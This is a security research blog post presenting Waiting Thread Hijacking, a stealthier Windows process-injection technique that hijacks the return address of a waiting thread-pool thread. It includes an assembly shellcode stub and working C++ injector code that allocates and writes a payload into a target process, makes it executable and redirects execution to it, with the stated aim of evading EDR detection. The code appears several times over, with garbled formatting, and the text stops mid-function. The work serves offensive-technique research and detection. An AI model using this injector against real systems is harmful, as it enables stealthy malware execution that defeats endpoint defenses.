# https://research.checkpoint.com/2025/waiting-thread-hijacking/

## CATEGORIES

- [Android Malware23](https://research.checkpoint.com/category/android-malware/)
- [Artificial Intelligence4](https://research.checkpoint.com/category/artificial-intelligence-2/)
- [ChatGPT3](https://research.checkpoint.com/category/chatgpt/)
- [Check Point Research Publications442](https://research.checkpoint.com/category/threat-research/)
- [Cloud Security1](https://research.checkpoint.com/category/cloud-security/)
- [CPRadio44](https://research.checkpoint.com/category/cpradio/)
- [Crypto2](https://research.checkpoint.com/category/crypto/)
- [Data & Threat Intelligence1](https://research.checkpoint.com/category/data-threat-intelligence/)
- [Data Analysis0](https://research.checkpoint.com/category/data-analysis/)
- [Demos22](https://research.checkpoint.com/category/demos/)
- [Global Cyber Attack Reports394](https://research.checkpoint.com/category/threat-intelligence-reports/)
- [How To Guides13](https://research.checkpoint.com/category/how-to-guides/)
- [Ransomware3](https://research.checkpoint.com/category/ransomware/)
- [Russo-Ukrainian War1](https://research.checkpoint.com/category/russo-ukrainian-war/)
- [Security Report1](https://research.checkpoint.com/category/security-report/)
- [Threat and data analysis0](https://research.checkpoint.com/category/threat-and-data-analysis/)
- [Threat Research173](https://research.checkpoint.com/category/threat-research-2/)
- [Web 3.0 Security11](https://research.checkpoint.com/category/web3/)
- [Wipers0](https://research.checkpoint.com/category/wipers/)

![](https://research.checkpoint.com/wp-content/uploads/2025/04/cropped-Snapshot_2025-04-14_19-55-261.png)

# Waiting Thread Hijacking: A Stealthier Version of Thread Execution Hijacking


April 14, 2025

[Share on LinkedIn!](https://www.linkedin.com/shareArticle?mini=true&url=https://research.checkpoint.com/2025/waiting-thread-hijacking/%20-%20%20https://research.checkpoint.com/?p=31349;source=LinkedIn "Share on LinkedIn!") [Share on Facebook!](http://www.facebook.com/sharer.php?u=https://research.checkpoint.com/2025/waiting-thread-hijacking/%20-%20https://research.checkpoint.com/?p=31349 "Share on Facebook!") [Tweet this!](http://twitter.com/home/?status=Waiting%20Thread%20Hijacking:%20A%20Stealthier%20Version%20of%20Thread%20Execution%20Hijacking%20-%20https://research.checkpoint.com/?p=31349%20via%20@kenmata "Tweet this!")

https://research.checkpoint.com/2025/waiting-thread-hijacking/

**Research by:** hasherezade

# Key Points

- Process Injection is one of the important techniques in the attackers’ toolkit. In the constant cat-and-mouse game, attackers try to invent its new implementations that bypass defenses, using creative methods and lesser-known APIs.
- Combining common building blocks in an atypical way, Check Point Research was able to create a much stealthier version of a known method, Thread Execution Hijacking.

# Introduction

Process injection is one of the [important techniques used by attackers](https://attack.mitre.org/techniques/T1055). We can find its variants implemented in almost every malware. It serves purposes such as:

- defense evasion: hiding malicious modules under the cover of a different process
- interference with existing processes: reading their memory, hooking used APIs, etc.
- privilege escalation

In [our previous blog](https://research.checkpoint.com/2024/thread-name-calling-using-thread-name-for-offense/) on [process injections](https://attack.mitre.org/techniques/T1055/) we explained the foundations of this topic and basic ideas behind detection and prevention. We also proposed a new technique dubbed [Thread Name-Calling](https://research.checkpoint.com/2024/thread-name-calling-using-thread-name-for-offense/) – abusing the Thread Name API that was originally intended to assign names to running threads. The technique allowed writing to a process using a handle without write access. Remote execution was achieved through [the new API for Asynchronous Procedure Calls (APC)](https://repnz.github.io/posts/apc/user-apc/#ntqueueapcthreadex2-some-new-friends-in-the-fast-ring), requesting a Special User APC. With the help of those building blocks, we were able to inject a payload and run it without being noticed by most tested EDRs (Endpoint Detection & Response systems). While remote write was implemented using an unexpected API, execution wasn’t completely novel since it was a variant of [APC injection](https://attack.mitre.org/techniques/T1055/004).

In the current research, we aim for the same goal: stealthy injection into a running process. This time we approach the problem from the opposite direction. We use common allocate and write primitives to achieve unexpected code execution. Furthermore, we show how to extend the implementation and obfuscate the called sequence of APIs in order to tamper behavioral signatures that could be used for detection. The described technique intercepts the flow of a waiting thread and misuses it for the execution of an implant – that’s why we dubbed it Waiting Thread Hijacking (WTH). It can be treated as an evolution of classic [Thread Hijacking](https://attack.mitre.org/techniques/T1055/003/). Unlike the older method, WTH avoids using APIs that trigger most alerts, such as `SuspendThread` / `ResumeThread` and [`SetThreadContext`](https://medium.com/tenable-techblog/api-series-setthreadcontext-d08c9f84458d).

It involves handles with the following access:

- For the target process: `PROCESS_VM_OPERATION`, `PROCESS_VM_READ`, `PROCESS_VM_WRITE`
- For the target thread: `THREAD_GET_CONTEXT`

Used APIs:

- `NtQuerySystemInformation` (with a parameter of `SystemProcessInformation` )
- `GetThreadContext`
- `ReadProcessMemory`
- `VirtualAllocEx`
- `WriteProcessMemory`
- `VirtualProtectEx`

The considered target is a 64-bit process with [medium integrity](https://jsecurity101.medium.com/better-know-a-data-source-process-integrity-levels-8338f3b74990).

# Executing Remote Code

To prevent remote code execution, AVs and EDRs try to monitor APIs related to known techniques (examples of monitored functions can be found in Mr-Un1k0d3r’s repository: [https://github.com/Mr-Un1k0d3r/EDRs](https://github.com/Mr-Un1k0d3r/EDRs)). The implementation of restrictions differs from product to product. While some products tolerate remote allocation and write, an attempt to run the implant will surely result in detection. Options for triggering execution are very limited, and all APIs meant for this purpose are closely watched. That’s why finding a new, unexpected way to do so is one of the biggest challenges attackers and red teamers face while trying to implement code injection.

The basic constraint is that code runs on [threads](https://www.microsoftpressstore.com/articles/article.aspx?p=2233328&seqNum=4). This leaves us with two possibilities: either to create a new thread in the target process, or to use some of the existing ones. An alternative way to run code are [fibers](https://www.ired.team/offensive-security/code-injection-process-injection/executing-shellcode-with-createfiber) (example: _ImmoralFiber, [BlackHat Asia 2024](https://github.com/JanielDary/ImmoralFiber)_), although at a low level they are still [managed by threads](https://learn.microsoft.com/en-us/windows/win32/procthread/fibers). While using fibers can help in hiding execution within a local process, it is not much helpful in achieving remote execution. In order to use them to run code within a remote process, the target must already have existing fibers. This drastically narrows down the list of possible targets, making this method unusable in most real-life scenarios.

The common approaches to remotely execute injected code:

- Remote thread creation
- Adding a function to the APC queue of an existing thread
- Direct manipulation of an existing thread’s context (`GetThreadContext`/ `SetThreadContext`). This includes using [`RtlRemoteCall`](https://www.alex-ionescu.com/rtlremotecall/) API (since it calls `GetThreadContext`/ `SetThreadContext` underneath).
- Installing hooks
- Replacing the defined callbacks

Let’s analyze each option one by one.

Creating a remote thread is straightforward, and involves using one of the APIs from the [CreateRemoteThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadscreateremotethread) series. Although we may [apply it in various ways](https://aliongreen.github.io/posts/remote-thread-injection.html), calling high- or low-level versions of those functions or even using raw syscalls, the end result won’t be very stealthy. Creation of a new thread generates a kernel callback that makes an EDR quickly notified about the suspicious intentions (via [`PsSetCreateThreadNotifyRoutine`](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreatethreadnotifyroutine)/ [`Ex`](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreatethreadnotifyroutineex) **)**,

This leads to the conclusion that what pays off more is giving up on creating new threads altogether, and somehow hopping onto an existing one. The most straightforward and convenient way is using APC, as it was explained in details in the [blog about Thread Name-Calling](https://research.checkpoint.com/2024/thread-name-calling-using-thread-name-for-offense/). This method however also has its drawbacks. In this scenario a kernel callback won’t be triggered, but yet, it generates an [ETW event](https://learn.microsoft.com/en-us/windows-hardware/drivers/devtest/event-tracing-for-windows--etw-), for which an AV/EDR product can listen. Second, a handle to the thread must be opened with `THREAD_SET_CONTEXT` access. The event of opening a handle also generates a kernel callback (that can be monitored in kernel mode via [ObRegisterCallbacks](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-obregistercallbacks)), so we should tend to avoid suspicious flags, and minimize the requested access.

Direct manipulation of an existing thread is a part of another old and well-known method, called [thread execution hijacking](https://attack.mitre.org/techniques/T1055/003/). It involves finding a thread within the target process, suspending it, changing its context to redirect the execution flow into our own code, and then resuming it. Just like APC injection, it requires the thread handle to be open with `THREAD_SET_CONTEXT`, plus another suspicious flag: `THREAD_SUSPEND_RESUME`. Another problem is that the APIs related to this method are usually monitored, which will get us stopped by an EDR. If we give up on all functions that require modifications of the thread context, we are left with simple writes to the target process’ memory. This seems like not much, but using it creatively can still achieve code execution.

One of the basic ideas from this category is API hooking. We can predict that there are some functions within the process that will be called at some point. If we intercept them, we can get our code to run alongside. There are multiple different options to implement hooks: inline as well as in IAT (Import Address Table) or EAT (Export Address Table). However, installing them requires overwriting a part of the loaded DLL, which often raises alerts.

The more creative approach is based on the fact that a process may use various callbacks executed on particular events. If we overwrite a pointer to the callback function, we can force our code to be executed instead. There are a variety of publications detailing different methods from this group. A few examples include:

- [Overwriting TLS callbacks](https://attack.mitre.org/techniques/T1055/005/)
- [Overwriting Kernel Callback Table](https://attack.mitre.org/techniques/T1574/013/)
- Overwriting GUI callbacks (examples: [odzhan blog](https://web.archive.org/web/20240316160018/https://modexp.wordpress.com/2019/04/25/seven-window-injection-methods/) #1)
- Overwriting ETW callbacks (example: [odzhan blog](https://web.archive.org/web/20240324163515/https://modexp.wordpress.com/2020/04/08/red-teams-etw/) #2)
- PROPagate – running code using Windows subclassing ( [hexacorn blog](https://www.hexacorn.com/blog/2017/10/26/propagate-a-new-code-injection-trick/) #1, [hexacorn blog](https://www.hexacorn.com/blog/2017/11/03/propagate-a-new-code-injection-trick-64-bit-and-32-bit/) #2)

An interesting and novel addition to this group was a technique described by Alon Leviev in his publication on [Thread “Pool-Party”](https://www.safebreach.com/blog/process-injection-using-windows-thread-pools/). His idea is based on the fact that Windows makes heavy use of [thread pools](https://www.microsoftpressstore.com/articles/article.aspx?p=2233328&seqNum=6). By getting a handle to the Worker Factory of the target, we can manipulate its structure to link to our implant and enforce its execution. For example, we can overwrite the start address within the Worker Factory’s structure redirecting it to our shellcode, and then trigger its run. It is also possible to install a new work item into the remote process by manually writing its structure and attaching it to the Worker Factory’s queue.

In the solution that we are going to introduce, some of the observations mentioned in the Alon’s paper will be used as well. However, the whole technique is much simpler and based on manipulating one of the threads that are products of the factory rather than the factory itself.

# What Problems Waiting Thread Hijacking Solves?

Waiting Thread Hijacking is a method inspired by the concepts of the [classic Thread Execution Hijacking](https://attack.mitre.org/techniques/T1055/003/), and the research about the [Thread Pool](https://www.microsoftpressstore.com/articles/article.aspx?p=2233328&seqNum=6). However, its usage is not strictly limited to the threads belonging to the thread pool.

Let’s think about what the biggest problems with the classic Thread Execution Hijacking are.

- First of all, we have to suspend a remote thread, and resume it afterwards. This may create some synchronization issues in the target application. But most importantly, it forces us to use `SuspendThread`/ `ResumeThread` API, and the thread handle with the access `THREAD_SUSPEND_RESUME`. Those are suspicious indicators that will surely be observed by an EDR.

  - _If only we could find a process where this is done automatically on the target side, we would avoid this hurdle…_
- Second, we need to redirect execution of the suspended thread to the implant. In the classic version of this technique, `SetThreadContext` (or its low-level equivalent, [`NtSetContextThread`](https://ntdoc.m417z.com/ntsetcontextthread)) is used. The redirection is done by modifying the Instruction Pointer. The direct setting of the thread context is very suspicious, and [noisy (generates two different ETW events)](https://medium.com/tenable-techblog/api-series-setthreadcontext-d08c9f84458d). It will most likely get us flagged by the AV/EDR. Also, it requires `THREAD_SET_CONTEXT` access on the handle, which we would like to avoid.

  - _Is it possible to change the thread’s execution flow without manually modifying its context?_
- Finally, returning to the original execution flow won’t be seamless. We need to store the original thread context somewhere, and restore it at our shellcode’s exit. The stability of the target process may be at risk.
  - _Is it possible to just return to the original execution without the need to set the thread context again?_

It turns out, those limitations can be overcome with a few simple tricks.

An old-school step used in the exploitation of buffer overflows is replacing the return address of the function with our own address. A working exploit may involve other primitives, like allocation of executable memory, or adding the execution permission. In order to circumvent this, restrictions like [DCP (Dynamic Code Prohibited)](https://www.ired.team/offensive-security/defense-evasion/acg-arbitrary-code-guard-processdynamiccodepolicy) have been invented. Those are also the typical events that Anti-exploit software will monitor. However, DCP policies do not apply if the executable memory is allocated within the target via an external process. It turns out, that the event of replacing the return address may also go unnoticed if it is done externally. In the current technique, we take advantage of it.

Still, we need to be very selective under which circumstances the return address can be overwritten. Since we have to avoid manual suspending/resuming of threads, we will use the threads that let us achieve the same effect by their own features. That is, waiting threads, which return addresses we can manipulate without destabilizing the whole application. Such threads can easily be found thanks to Thread Pools.

## Thread Pools Basics

The [concept of Thread Pools](https://learn.microsoft.com/en-us/windows/win32/procthread/thread-pools) has been around since early editions of Windows, and its modern form was introduced in Vista. The details of the API, and its evolution are [described on MSDN](https://learn.microsoft.com/en-us/windows/win32/procthread/thread-pools).

Thread Pools are the way of optimizing the thread creation and task processing. Rather than creating a new thread each time when there is some new event to handle, we have a set of ready-made threads that are reused. Part of the Thread Pool architecture is the presence of work queue and waiter threads.

By inspecting processes using tools like Process Explorer or [System Informer](https://systeminformer.com/), you can observe the thread pool mechanism at work. Most of the default Windows processes consist of multiple threads, many of which are in a waiting state. The callstacks of those threads contain functions prefixed with `Tp*` – that stand for Thread Pool.

![Figure 2 - View from ProcessExplorer. Example of the callstack of a thread belonging to a pool, and waiting in the WrQueue.](https://research.checkpoint.com/wp-content/uploads/2025/04/1BJM555JLK-rId58.png)Figure 1 – View from ProcessExplorer. Example of the callstack of a thread belonging to a pool, and waiting in the WrQueue.

## Taking Advantage of Thread Pools

On any modern Windows system we find [plenty of processes with waiting threads](https://scorpiosoftware.net/2022/03/21/threads-threads-and-more-threads/), that are managed by a Thread Pool. They can provide the building blocks to create a stealthier version of Thread Execution Hijacking.

Rather than suspending and then resuming one of the existing threads, we can take advantage of one of the waiting threads that are dormant. These threads will automatically reactivate on the awaited event, giving us exactly the effect that we wanted to achieve, without the need of calling external APIs.

Another problem to solve was related to changing the thread context. This time we won’t manipulate the instruction pointer directly. In the considered case, we are dealing with the thread that waits on a syscall for its completion. The last executed function was simply a corresponding syscall wrapper within NTDLL. Knowing that those wrappers use a very simple layout, we are sure that the last element on the stack is a return address. So, we can simply get the context of the thread, read the stack pointer, and then replace the return address with the pointer to our own code.

All that is needed to perform those operations is a thread handle with [`THREAD_GET_CONTEXT`](https://learn.microsoft.com/en-us/windows/win32/procthread/thread-security-and-access-rights), and a process handle with the read/write permissions ( `PROCESS_VM_READ | PROCESS_VM_WRITE` ).

While interference in threads involving suspending/resuming and manual context setting will be blocked by most EDRs, this approach allows to avoid the common triggers and achieve the code execution.

## Identifying Suitable Threads

In theory, any waiting thread, regardless of the wait reason, can be subject to hijacking. But of course we don’t want to introduce synchronization issues in the attacked application. One of the safe options is to pick threads with the wait reason `WrQueue`. This reason indicates that the thread is waiting on a `KQUEUE` object, which is a kernel object used to manage queues of IRPs.

To find them, we use the native function `NtQuerySystemInformation` with a parameter `SystemProcessInformation`, allowing us to enumerate all processes and threads and extract useful information. For each thread, it retrieves the structure [`SYSTEM_THREAD_INFORMATION`](https://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/ex/sysinfo/thread.htm). The field `ThreadState` allows checking if the thread is currently waiting, and the `WaitReason` gives more information on what caused it.

The presence of the `WrQueue` wait reason indicates that we are dealing with one of two possible scenarios.

1. The wait happens inside the `NtRemoveIoCompletion` that was called by kernelbase → `GetQueuedCompletionStatus`:

![](https://research.checkpoint.com/wp-content/uploads/2025/04/1BJM555JLK-rId66.png)Figure 2 – Inside the function `GetQueuedCompletionStatus` . The highlighted line shows the return address of the syscall wrapper.

1. The wait happens inside `NtWaitForWorkViaWorkerFactory` that was called by ntdll → `TppWorkerThread`

![Figure 4 - Inside the function <code>TppWorkerThread</code> . The highlighted line shows the return address of the syscall wrapper.](https://research.checkpoint.com/wp-content/uploads/2025/04/1BJM555JLK-rId69.png)Figure 3 – Inside the function `TppWorkerThread` . The highlighted line shows the return address of the syscall wrapper.

_The original return address is highlighted in gray on each picture._

In both cases, the situation is favorable for hijacking. The thread waits on syscall completion within a syscall wrapper function. Those wrappers do not create stack frames. The first argument at the top of the stack is the return address, leading back to the caller’s function.

## Ensuring a Happy Ending

One of the important things to remember while implementing an injection method, is ensuring that after executing our code the target application won’t crash.

In Waiting Thread Hijacking, we replace the original address with our own. So, once the wait finishes, the return address will be picked from the stack, and followed. Since now it is overwritten with the pointer to our shellcode, that will lead to the execution of the implant. However, we interrupted the normal execution flow of the function, so there is a risk to the stability of the target process. One way to prevent the crash at the end, is to make the shellcode never return – i.e. by making it stuck in the infinite `Sleep` loop. But it is not the best solution. For example, we will miss processing some events for which the thread was originally waiting. While this might not cause a critical issue, it’s still suboptimal.

Fortunately, restoring the original execution flow is relatively straightforward with an appropriate stub.

The template:

Plain text

Copy to clipboard

Open code in new window

EnlighterJS 3 Syntax Highlighter

\[SAVED\_RET\_PTR\] ; space where the original return pointer will be saved

pushf; store original flags, and values of registers:

push rax

push rcx

push rdx

push rbx

push rbp

push rsi

push rdi

push r8

push r9

push r10

push r11

push r12

push r13

push r14

push r15

call shellcode\_main ; call our main shellcode function

pop r15 ;restore original flags, and values of registers:

pop r14

pop r13

pop r12

pop r11

pop r10

pop r9

pop r8

pop rdi

pop rsi

pop rbp

pop rbx

pop rdx

pop rcx

pop rax

popf

jmp qword ptr ds:\[SAVED\_RET\_PTR\] ;jump to the original return address

\[shellcode\_main\] ; the vital part of the shellcode

\[SAVED\_RET\_PTR\] ; space where the original return pointer will be saved
pushf ; store original flags, and values of registers:
push rax
push rcx
push rdx
push rbx
push rbp
push rsi
push rdi
push r8
push r9
push r10
push r11
push r12
push r13
push r14
push r15
call shellcode\_main ; call our main shellcode function
pop r15 ;restore original flags, and values of registers:
pop r14
pop r13
pop r12
pop r11
pop r10
pop r9
pop r8
pop rdi
pop rsi
pop rbp
pop rbx
pop rdx
pop rcx
pop rax
popf
jmp qword ptr ds:\[SAVED\_RET\_PTR\] ;jump to the original return address
\[shellcode\_main\] ; the vital part of the shellcode

```
[SAVED_RET_PTR] ; space where the original return pointer will be saved
pushf           ; store original flags, and values of registers:
push rax
push rcx
push rdx
push rbx
push rbp
push rsi
push rdi
push r8
push r9
push r10
push r11
push r12
push r13
push r14
push r15
call shellcode_main ; call our main shellcode function
pop r15             ;restore original flags, and values of registers:
pop r14
pop r13
pop r12
pop r11
pop r10
pop r9
pop r8
pop rdi
pop rsi
pop rbp
pop rbx
pop rdx
pop rcx
pop rax
popf
jmp qword ptr ds:[SAVED_RET_PTR] ;jump to the original return address
[shellcode_main] ; the vital part of the shellcode
```

The stub starts from a free space of a pointer size. This is where the previous return address will be saved by the injector, before being replaced. The code starts after that. It saves the flags, and all the general purpose registers that may contain vital data needed to continue with normal execution later. With the context saved, we can now execute the shellcode responsible for any planned activity (in case of a PoC, that is, traditionally, popping up the calc.exe). After the main function returned, we restore the previously saved registers and flags, and then jump to the original return address.

Let’s see it in action.

Step 1 – As the wait finished, the execution is about to follow the return address. In our case, the address on the stack has been replaced.

![](https://research.checkpoint.com/wp-content/uploads/2025/04/1BJM555JLK-rId73.png)Figure 4 – Inside the syscall wrapper: `NtWaitForWorkViaWorkerFactory`. Upon the syscall completion, the function will pick the first entry from the stack, that was overwritten, and use it as a return address.

Step 2 – The shellcode starts execution from saving all the flags, and registers. They will be restored at the end, to recover the original values.

![](https://research.checkpoint.com/wp-content/uploads/2025/04/1BJM555JLK-rId76.png)Figure 5 – View of the stub within the implanted shellcode. The right panel shows the values of the registers BEFORE the shellcode execution.

Step 3 – The shellcode finished its execution. The registers are restored to the same state as they were in the beginning. The jump at the end of the shellcode will take us back to the original return address.

![](https://research.checkpoint.com/wp-content/uploads/2025/04/1BJM555JLK-rId79.png)Figure 6 – View of the stub within the implanted shellcode. The right panel shows the values of the registers AFTER the shellcode execution.

Step 4 – The execution returns to the original function.

![Figure 8 - After the implant finished, the execution flow returned to the place where the syscall wrapper would normally return.](https://research.checkpoint.com/wp-content/uploads/2025/04/1BJM555JLK-rId82.png)Figure 7 – After the implant finished, the execution flow returned to the place where the syscall wrapper would normally return.

# Implementation

Having all those building blocks, let’s have a look at the final implementation.

![](https://research.checkpoint.com/wp-content/uploads/2025/04/rId87.gif)Figure 8 – Animation showing all the main steps of Waiting Thread Hijacking.

The writes (and possible allocation) are done in a standard way, using `VirtualAllocEx` + `WriteProcessMemory`. After the shellcode is planted in the target, we proceed to set up for its execution. Enumerating all the threads in the process, we scan for those that are currently in a waiting mode, select one of them, and overwrite its return address. Once the thread switches back to the active mode, it will resume its execution returning to the replaced address, which now leads to the implant. After executing the implant, the thread should return seamlessly to its casual duties.

Code snippet:

Plain text

Copy to clipboard

Open code in new window

EnlighterJS 3 Syntax Highlighter

boolcheck\_ret\_target(LPVOID ret)

{

HMODULE mod = get\_module\_by\_address((LPVOID)ret);

if(mod == NULL){

std::cout <<"Pointer not in any recognized module.\\n";

returnfalse;

}

if(mod == GetModuleHandleA("ntdll.dll") \|\|

mod == GetModuleHandleA("kernelbase.dll") \|\|

mod == GetModuleHandleA("kernel32.dll"))

{

returntrue;

}

std::cout <<"Pointer not in ntdll/kernel32.\\n";

returnfalse;

}

boolrun\_injected(DWORD pid, ULONGLONG shellcodePtr, KWAIT\_REASON wait\_reason)

{

std::cout <<"Enumerating threads of PID: "<< pid <<"\\n";

std::map<DWORD, thread\_info> threads\_info;

if(!pesieve::util::fetch\_threads\_info(pid, threads\_info)){

returnfalse;

}

HANDLE hProcess = OpenProcess(PROCESS\_VM\_READ \| PROCESS\_VM\_WRITE, FALSE, pid);

if(!hProcess)returnfalse;

CONTEXT ctx = { 0 };

ULONGLONG suitable\_ret\_ptr = 0;

ULONGLONG suitable\_ret = 0;

std::cout <<"Threads: "<< threads\_info.size()<< std::endl;

for(auto itr = threads\_info.begin(); itr != threads\_info.end(); ++itr){

thread\_info& info = itr->second;

if(!info.is\_extended)returnfalse;

if(info.ext.state == Waiting){

std::cout <<"TID: "<< info.tid<< std::hex <<" : wait reason: "<< std::dec << info.ext.wait\_reason<<"\\n";

if(info.ext.wait\_reason != wait\_reason \|\| !read\_context(info.tid, ctx)){

continue;

}

ULONGLONG ret = read\_return\_ptr<ULONGLONG>(hProcess, ctx.Rsp);

std::cout <<"RET: "<< std::hex << ret <<"\\n";

if(!suitable\_ret\_ptr){

if(!check\_ret\_target((LPVOID)ret)){

std::cout <<"Not supported ret target. Skipping!\\n";

continue;

}

suitable\_ret\_ptr = ctx.Rsp;

suitable\_ret = ret;

std::cout <<"\\tUsing as a target!\\n";

break;

}

}

else{

std::cout <<"TID: "<< itr->first <<"is NOT waiting, State: "<< info.ext.state<<"\\n";

}

}

bool is\_injected = false;

if(suitable\_ret\_ptr){

// overwrite the shellcode with the jump back

SIZE\_T written = 0;

if(ntapi::WriteProcessMemory(hProcess, (LPVOID)shellcodePtr, &suitable\_ret, sizeof(suitable\_ret), &written) && written == sizeof(suitable\_ret)){

std::cout <<"Shellcode ptr overwritten! Written: "<< written <<" \\n";

}

else{

std::cout <<"Failed to overwrite shellcode jmp back: "<< std::hex <<GetLastError()<<"\\n";

returnfalse;

}

if(!protect\_memory(pid, (LPVOID)shellcodePtr, sizeof(g\_payload), PAGE\_EXECUTE\_READ)){

std::cerr <<"Failed making memory executable!\\n";

returnfalse;

}

shellcodePtr += 0x8; // after the saved return...

std::cout <<"Trying to overwrite: "<< std::hex << suitable\_ret\_ptr <<" -\> "<< suitable\_ret <<" with: "<< shellcodePtr << std::endl;

if(ntapi::WriteProcessMemory(hProcess, (LPVOID)suitable\_ret\_ptr, &shellcodePtr, sizeof(shellcodePtr), &written) && written == sizeof(shellcodePtr)){

std::cout <<"Ret overwritten!\\n";

is\_injected = true;

}

}

CloseHandle(hProcess);

return is\_injected;

}

boolexecute\_injection(DWORD processID)

{

LPVOID shellcodePtr = NULL;

{

HANDLE hProcess = OpenProcess(PROCESS\_VM\_OPERATION, FALSE, processID);

if(!hProcess)returnfalse;

shellcodePtr = ntapi::VirtualAllocEx(hProcess, nullptr, sizeof(g\_payload), MEM\_COMMIT \| MEM\_RESERVE, PAGE\_READWRITE);

CloseHandle(hProcess);

if(!shellcodePtr)returnfalse;

}

{

HANDLE hProcess = OpenProcess(PROCESS\_VM\_OPERATION \| PROCESS\_VM\_WRITE, FALSE, processID);

if(!hProcess)returnfalse;

SIZE\_T written = 0;

bool isOk = ntapi::WriteProcessMemory(hProcess, (LPVOID)shellcodePtr, g\_payload, sizeof(g\_payload), &written);

CloseHandle(hProcess);

if(!isOk)returnfalse;

}

returnrun\_injected(processID, (ULONG\_PTR)shellcodePtr, WrQueue);

}

bool check\_ret\_target(LPVOID ret)
{
HMODULE mod = get\_module\_by\_address((LPVOID)ret);
if (mod == NULL) {
std::cout << "Pointer not in any recognized module.\\n";
return false;
}
if (mod == GetModuleHandleA("ntdll.dll") \|\|
mod == GetModuleHandleA("kernelbase.dll") \|\|
mod == GetModuleHandleA("kernel32.dll"))
{
return true;
}
std::cout << "Pointer not in ntdll/kernel32.\\n";
return false;
}

bool run\_injected(DWORD pid, ULONGLONG shellcodePtr, KWAIT\_REASON wait\_reason)
{
std::cout << "Enumerating threads of PID: " << pid << "\\n";
std::map<DWORD, thread\_info> threads\_info;
if (!pesieve::util::fetch\_threads\_info(pid, threads\_info)) {
return false;
}

HANDLE hProcess = OpenProcess(PROCESS\_VM\_READ \| PROCESS\_VM\_WRITE, FALSE, pid);
if (!hProcess) return false;

CONTEXT ctx = { 0 };
ULONGLONG suitable\_ret\_ptr = 0;
ULONGLONG suitable\_ret = 0;
std::cout << "Threads: " << threads\_info.size() << std::endl;
for (auto itr = threads\_info.begin(); itr != threads\_info.end(); ++itr) {
thread\_info& info = itr->second;

if (!info.is\_extended) return false;

if (info.ext.state == Waiting) {
std::cout << "TID: " << info.tid << std::hex << " : wait reason: " << std::dec << info.ext.wait\_reason << "\\n";
if (info.ext.wait\_reason != wait\_reason \|\| !read\_context(info.tid, ctx)) {
continue;
}
ULONGLONG ret = read\_return\_ptr<ULONGLONG>(hProcess, ctx.Rsp);
std::cout << "RET: " << std::hex << ret << "\\n";
if (!suitable\_ret\_ptr) {
if (!check\_ret\_target((LPVOID)ret)) {
std::cout << "Not supported ret target. Skipping!\\n";
continue;
}
suitable\_ret\_ptr = ctx.Rsp;
suitable\_ret = ret;
std::cout << "\\tUsing as a target!\\n";
break;
}
}
else {
std::cout << "TID: " << itr->first << "is NOT waiting, State: " << info.ext.state << "\\n";
}
}
bool is\_injected = false;
if (suitable\_ret\_ptr) {
// overwrite the shellcode with the jump back
SIZE\_T written = 0;
if (ntapi::WriteProcessMemory(hProcess, (LPVOID)shellcodePtr, &suitable\_ret, sizeof(suitable\_ret), &written) && written == sizeof(suitable\_ret)) {
std::cout << "Shellcode ptr overwritten! Written: " << written << " \\n";
}
else {
std::cout << "Failed to overwrite shellcode jmp back: " << std::hex << GetLastError() << "\\n";
return false;
}
if (!protect\_memory(pid, (LPVOID)shellcodePtr, sizeof(g\_payload), PAGE\_EXECUTE\_READ)) {
std::cerr << "Failed making memory executable!\\n";
return false;
}

shellcodePtr += 0x8; // after the saved return...
std::cout << "Trying to overwrite: " << std::hex << suitable\_ret\_ptr << " -> " << suitable\_ret << " with: " << shellcodePtr << std::endl;
if (ntapi::WriteProcessMemory(hProcess, (LPVOID)suitable\_ret\_ptr, &shellcodePtr, sizeof(shellcodePtr), &written) && written == sizeof(shellcodePtr)) {
std::cout << "Ret overwritten!\\n";
is\_injected = true;
}
}
CloseHandle(hProcess);
return is\_injected;
}

bool execute\_injection(DWORD processID)
{
LPVOID shellcodePtr = NULL;

{
HANDLE hProcess = OpenProcess(PROCESS\_VM\_OPERATION, FALSE, processID);
if (!hProcess) return false;

shellcodePtr = ntapi::VirtualAllocEx(hProcess, nullptr, sizeof(g\_payload), MEM\_COMMIT \| MEM\_RESERVE, PAGE\_READWRITE);
CloseHandle(hProcess);
if (!shellcodePtr) return false;
}

{
HANDLE hProcess = OpenProcess(PROCESS\_VM\_OPERATION \| PROCESS\_VM\_WRITE, FALSE, processID);
if (!hProcess) return false;

SIZE\_T written = 0;
bool isOk = ntapi::WriteProcessMemory(hProcess, (LPVOID)shellcodePtr, g\_payload, sizeof(g\_payload), &written);
CloseHandle(hProcess);
if (!isOk) return false;
}
return run\_injected(processID, (ULONG\_PTR)shellcodePtr, WrQueue);
}

```
bool check_ret_target(LPVOID ret)
{
    HMODULE mod = get_module_by_address((LPVOID)ret);
    if (mod == NULL) {
        std::cout << "Pointer not in any recognized module.\n";
        return false;
    }
    if (mod == GetModuleHandleA("ntdll.dll") ||
        mod == GetModuleHandleA("kernelbase.dll") ||
        mod == GetModuleHandleA("kernel32.dll"))
    {
        return true;
    }
    std::cout << "Pointer not in ntdll/kernel32.\n";
    return false;
}

bool run_injected(DWORD pid, ULONGLONG shellcodePtr, KWAIT_REASON wait_reason)
{
    std::cout << "Enumerating threads of PID: " << pid << "\n";
    std::map<DWORD, thread_info> threads_info;
    if (!pesieve::util::fetch_threads_info(pid, threads_info)) {
        return false;
    }

    HANDLE hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, pid);
    if (!hProcess) return false;

    CONTEXT ctx = { 0 };
    ULONGLONG suitable_ret_ptr = 0;
    ULONGLONG suitable_ret = 0;
    std::cout << "Threads: " << threads_info.size() << std::endl;
    for (auto itr = threads_info.begin(); itr != threads_info.end(); ++itr) {
        thread_info& info = itr->second;

        if (!info.is_extended) return false;

        if (info.ext.state == Waiting) {
            std::cout << "TID: " << info.tid << std::hex << " : wait reason: " << std::dec << info.ext.wait_reason << "\n";
            if (info.ext.wait_reason != wait_reason || !read_context(info.tid, ctx)) {
                continue;
            }
            ULONGLONG ret = read_return_ptr<ULONGLONG>(hProcess, ctx.Rsp);
            std::cout << "RET: " << std::hex << ret << "\n";
            if (!suitable_ret_ptr) {
                if (!check_ret_target((LPVOID)ret)) {
                    std::cout << "Not supported ret target. Skipping!\n";
                    continue;
                }
                suitable_ret_ptr = ctx.Rsp;
                suitable_ret = ret;
